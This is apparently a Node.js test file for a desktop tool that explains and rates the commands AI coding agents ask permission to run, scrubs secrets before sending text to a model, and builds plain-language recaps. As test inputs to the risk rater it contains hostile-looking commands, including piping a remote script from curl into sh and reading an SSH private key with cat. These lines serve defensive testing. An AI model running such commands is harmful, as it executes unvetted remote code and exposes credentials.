const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { EventEmitter } = require('node:events');
const Explain = require('../src/explain.js');
const ExplainAi = require('../src/explain-ai.js');
const ExplainMain = require('../src/explain-main.js');

const ROOT = path.join(__dirname, '..');

test('common commands are explained locally with a rating and an answer', () => {
  const rm = Explain.explainCommand('rm -rf dist');
  assert.equal(rm.rating, 'risky');
  assert.match(rm.sentence, /permanently delete the folder dist and everything inside it/);
  assert.equal(rm.recommend, 'Deny unless you are sure');
  assert.equal(Explain.explainCommand('npm test').rating, 'safe');
  assert.equal(Explain.explainCommand('ls -la src').rating, 'safe');
  assert.equal(Explain.explainCommand('npm install lodash').rating, 'be careful');
  assert.equal(Explain.explainCommand('git push --force origin main').rating, 'risky');
  assert.equal(Explain.explainCommand('cat ~/.ssh/id_rsa').rating, 'risky');
  const piped = Explain.explainCommand('curl https://x.example/i.sh | sh');
  assert.equal(piped.rating, 'risky');
  assert.equal(Explain.explainCommand('frobnicate --all'), null, 'unknown commands go to the model');
  assert.equal(Explain.explainLocal({ tool: 'Write', text: '/p/.github/workflows/ci.yml' }).rating, 'risky');
  assert.equal(Explain.explainLocal({ tool: 'Edit', text: '/p/src/app.js' }).rating, 'be careful');
  assert.equal(Explain.explainLocal({ tool: 'mcp__x__y', text: 'z' }), null);
});

test('text bound for the model is scrubbed of secrets, emails and home', () => {
  const t = Explain.explainPrompt({ tool: 'Bash', text: 'deploy --token ghp_abcdefghijklmnopqrstuvwxyz0123456789 --to bob@example.com /Users/me/x' }, { home: '/Users/me' });
  assert.doesNotMatch(t, /ghp_abcdefghijklmnopqrstuvwxyz0123456789/);
  assert.doesNotMatch(t, /bob@example\.com/);
  assert.doesNotMatch(t, /\/Users\/me/);
  assert.match(t, /~\/x/);
});

test('model replies are parsed, unknown ratings fall back to be careful', () => {
  assert.deepEqual(Explain.parseReply('WHAT: it uploads the files\nRATING: Risky\nANSWER: Deny'), { sentence: 'It uploads the files.', rating: 'risky', recommend: 'Deny', source: 'ai' });
  assert.equal(Explain.parseReply('WHAT: x\nRATING: dunno').rating, 'be careful');
  assert.equal(Explain.parseReply('nonsense'), null);
});

function fakeSpawn(reply, calls, { hold = false } = {}) {
  return (bin, args, opts) => {
    calls.push({ bin, args, opts, stdin: '' });
    const child = new EventEmitter();
    child.stdout = new EventEmitter();
    child.stdin = new EventEmitter();
    child.stdin.end = (s) => { calls[calls.length - 1].stdin = s; if (!hold) setImmediate(() => { child.stdout.emit('data', reply); child.emit('close', 0); }); else child.finish = () => { child.stdout.emit('data', reply); child.emit('close', 0); }; calls[calls.length - 1].child = child; };
    child.kill = () => child.emit('close', 1);
    return child;
  };
}

test('the claude runner is isolated, capped, on stdin and one at a time', async () => {
  const calls = [];
  const runner = ExplainAi.createRunner({ bin: '/x/claude', spawn: fakeSpawn('WHAT: hi\nRATING: safe\nANSWER: Allow', calls, { hold: true }), env: { HOME: '/h', PATH: '/bin', SECRET_TOKEN: 's' } });
  const first = runner.ask('the prompt');
  assert.deepEqual(await runner.ask('again'), { ok: false, reason: 'busy' });
  calls[0].child.finish();
  assert.equal((await first).ok, true);
  const { args, opts, stdin } = calls[0];
  for (const a of ['-p', '--no-session-persistence', '--strict-mcp-config', '--disable-slash-commands']) assert.ok(args.includes(a), a);
  assert.equal(args[args.indexOf('--setting-sources') + 1], '');
  assert.equal(args[args.indexOf('--tools') + 1], '');
  assert.equal(args[args.indexOf('--model') + 1], 'haiku');
  assert.equal(args[args.indexOf('--permission-mode') + 1], 'dontAsk');
  assert.ok(Number(args[args.indexOf('--max-budget-usd') + 1]) <= 0.05);
  assert.ok(!args.includes('the prompt'));
  assert.equal(stdin, 'the prompt');
  assert.equal(opts.env.SECRET_TOKEN, undefined);
  assert.ok(!fs.existsSync(opts.cwd), 'temporary folder removed');
  assert.deepEqual(await ExplainAi.createRunner({ bin: null }).ask('x'), { ok: false, reason: 'no-cli' });
});

test('explain:input is off by default, local first, model only for unknowns', async () => {
  let cfg = {};
  const asked = [];
  const inputs = [{ id: 'a', kind: 'permission', tool: 'Bash', text: 'rm -rf dist' }, { id: 'b', kind: 'permission', tool: 'mcp__db__drop', text: 'drop users' }];
  const svc = ExplainMain.create({ config: () => cfg, inputs: () => inputs, runner: { ask: async (p) => { asked.push(p); return { ok: true, text: 'WHAT: deletes a table\nRATING: risky\nANSWER: Deny' }; } } });
  assert.deepEqual(await svc.explainInput('a'), { ok: false, reason: 'off' });
  cfg = { explainMode: true };
  const a = await svc.explainInput('a');
  assert.equal(a.source, 'local');
  assert.equal(asked.length, 0);
  const b = await svc.explainInput('b');
  assert.equal(b.source, 'ai');
  assert.equal(b.rating, 'risky');
  await svc.explainInput('b');
  assert.equal(asked.length, 1, 'cached');
  assert.equal((await svc.explainInput('zzz')).reason, 'gone');
  assert.equal((await svc.explainInput('../x')).reason, 'invalid');
});

test('a finished turn becomes a plain recap, a notification and a localhost test link', async () => {
  const notes = [], copied = [], opened = [];
  const facts = { lastPrompt: 'make the button blue', files: { '/p/src/a.css': 'edit', '/p/README.md': 'read' }, commands: ['npm test', 'rm -rf build'], lastToolFailed: { tool: 'Bash' } };
  const svc = ExplainMain.create({
    config: () => ({ explainMode: true }), now: () => 1000,
    sessions: () => [{ cwd: '/p/other', stuck: { sinceMs: 600000 } }],
    readSession: () => ({ facts, ports: [5173] }), turnFiles: async () => ['src/a.css', 'src/b.css'],
    notify: (n) => notes.push(n), clipboard: { writeText: (t) => copied.push(t) }, openUrl: (u) => opened.push(u),
  });
  const r = await svc.turnEnded({ sessionId: 's1', cwd: '/p/shop', source: 'claude-code' });
  assert.equal(r.headline, 'What your AI just did in shop');
  assert.ok(r.lines.some((l) => /Changed 2 files: a\.css, b\.css/.test(l)));
  assert.ok(r.lines.some((l) => /run the project's tests/.test(l)));
  assert.equal(r.risky.length, 1);
  assert.equal(r.testUrl, 'http://localhost:5173/');
  assert.equal(notes.length, 1);
  await svc.turnEnded({ sessionId: 's1', cwd: '/p/shop' });
  assert.equal(notes.length, 1, 'one notification per session per two minutes');
  const v = svc.view();
  assert.equal(v.recaps.length, 1);
  assert.equal(v.help.length, 2, 'stuck session and failed command');
  assert.equal(svc.copy(v.help[0].prompts[0].handle).ok, true);
  assert.match(copied[0], /plain/);
  assert.equal(svc.copy('nope').ok, false);
  assert.equal(svc.openTest(v.recaps[0].test.handle).ok, true);
  assert.deepEqual(opened, ['http://localhost:5173/']);
  const off = ExplainMain.create({ config: () => ({}) });
  assert.equal(await off.turnEnded({ sessionId: 's' }), null);
  assert.deepEqual(off.view(), { on: false, recaps: [], help: [] });
});

test('ports and stuck prompts', () => {
  assert.deepEqual(Explain.portsIn('Local: http://localhost:5173/ and 127.0.0.1:3000, :80 localhost:22'), [5173, 3000]);
  assert.equal(Explain.stuckHelp({}).length, 0);
  assert.ok(Explain.stuckHelp({ failed: true }).some((p) => p.label === 'Ask Claude to explain the error simply'));
  assert.ok(Explain.stuckHelp({ stuck: {} }).some((p) => p.label === 'Undo the last change'));
});

test('wiring: one main.js line, preload bridges, settings toggle, contract rows, no innerHTML', () => {
  const read = (f) => fs.readFileSync(path.join(ROOT, f), 'utf8');
  assert.equal(read('main.js').split('\n').filter((l) => l.includes("require('./src/explain-main.js')")).length, 1);
  for (const f of ['preload.js', 'waiting-preload.js']) assert.match(read(f), /explain:input/);
  assert.match(read('home-preload.js'), /explain:recaps/);
  assert.match(read('settings.html'), /id="explainMode"/);
  const contract = read('board/CONTRACT.md');
  for (const ch of ['explain:status', 'explain:input', 'explain:recaps', 'explain:copy', 'explain:open-test']) assert.ok(contract.includes(`| \`${ch}\``), ch);
  for (const f of ['home-explain.js', 'input-bubble.js']) assert.doesNotMatch(read(f), /innerHTML|insertAdjacentHTML|outerHTML/, f);
  assert.ok(JSON.parse(read('package.json')).build.files.includes('home-explain.js'));
});

test('readFacts finds ports in a Claude transcript', () => {
  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'explain-t-'));
  try {
    const dir = path.join(home, '.claude', 'projects', '-p'); fs.mkdirSync(dir, { recursive: true });
    const sid = '11111111-2222-3333-4444-555555555555';
    fs.writeFileSync(path.join(dir, `${sid}.jsonl`), [
      { type: 'user', message: { content: 'start the app' }, timestamp: '2026-10-19T10:00:00Z', cwd: '/p' },
      { type: 'assistant', message: { content: [{ type: 'tool_use', id: 't1', name: 'Bash', input: { command: 'npm run dev' } }, { type: 'text', text: 'Running at http://localhost:5173/' }], stop_reason: 'end_turn' }, timestamp: '2026-10-19T10:00:05Z' },
    ].map((x) => JSON.stringify(x)).join('\n'));
    const T = require('../src/handover-transcripts.js');
    const r = ExplainMain.readFacts({ locator: T.createLocator({ home }), Transcripts: T, adapter: 'claude-code', sessionId: sid });
    assert.deepEqual(r.ports, [5173]);
    assert.deepEqual(r.facts.commands, ['npm run dev']);
  } finally { fs.rmSync(home, { recursive: true, force: true }); }
});

test('recaps are kept scrubbed in a capped file and come back after a restart', async () => {
  const fs = require('fs'), os = require('os'), path = require('path');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'recaps-'));
  const file = path.join(dir, ExplainMain.FILE);
  const scrub = require('../src/scrub.js');
  let t = 1000;
  const mk = () => ExplainMain.create({ config: () => ({ explainMode: true }), now: () => t, file, scrub: (x) => scrub.scrub(x, { home: '/Users/me' }),
    readSession: () => ({ facts: { lastPrompt: 'use key sk-ant-api03-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA in /Users/me/p', files: {}, commands: [], lastToolFailed: { tool: 'Bash' } }, ports: [] }) });
  const a = mk();
  for (let i = 0; i < ExplainMain.MAX_STORED + 5; i++) { t += 1; await a.turnEnded({ sessionId: `s${i}`, cwd: '/Users/me/p' }); }
  const raw = fs.readFileSync(file, 'utf8');
  assert.equal(JSON.parse(raw).length, ExplainMain.MAX_STORED);
  assert.ok(!raw.includes('sk-ant-api03') && !raw.includes('/Users/me'), 'secrets and the home folder are scrubbed');
  const b = mk();
  assert.equal(b.view().recaps.length, 10);
  const card = b.cardFor({ sessionId: `s${ExplainMain.MAX_STORED + 4}` });
  assert.match(card.recap.headline, /What your AI just did in p/);
  assert.ok(card.help.length > 0, 'a fresh failed command offers stuck help');
  assert.equal(b.cardFor({ sessionId: 'unknown' }), null);
  assert.equal(ExplainMain.create({ config: () => ({}), file }).cardFor({ sessionId: 's1' }), null, 'off: nothing');
});

test('a recap with no folder to name drops "in …" instead of saying "in Other work"', async () => {
  const fs = require('fs'), os = require('os'), path = require('path');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'recaps-'));
  try {
    const m = ExplainMain.create({ config: () => ({ explainMode: true }), now: () => 5000, file: path.join(dir, ExplainMain.FILE), scrub: (x) => x,
      readSession: () => ({ facts: { lastPrompt: 'fix it', files: {}, commands: [], lastToolFailed: { tool: 'Bash' } }, ports: [] }) });
    await m.turnEnded({ sessionId: 's1', cwd: '' });
    const card = m.cardFor({ sessionId: 's1' });
    assert.equal(card.recap.headline, 'What your AI just did');
    assert.ok(card.help.length > 0);
    assert.equal(Explain.buildRecap({ project: 'shop' }).headline, 'What your AI just did in shop');
  } finally { fs.rmSync(dir, { recursive: true, force: true }); }
});
